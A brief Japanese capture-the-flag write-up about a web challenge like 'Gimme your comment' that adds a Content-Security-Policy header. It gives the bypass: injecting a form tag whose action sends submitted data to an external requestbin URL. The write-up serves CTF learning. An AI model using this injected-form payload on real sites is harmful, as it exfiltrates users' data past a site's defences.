あれ、Gimme your commentと変わってないじゃんと思ったら、CSPがついてた。
```
Content-Security-Policy: default-src 'self'
```
formタグを入れて、送信先を変えればOK
```
<form action="http://requestbin.fullcontact.com/qqbwmoqq">
```
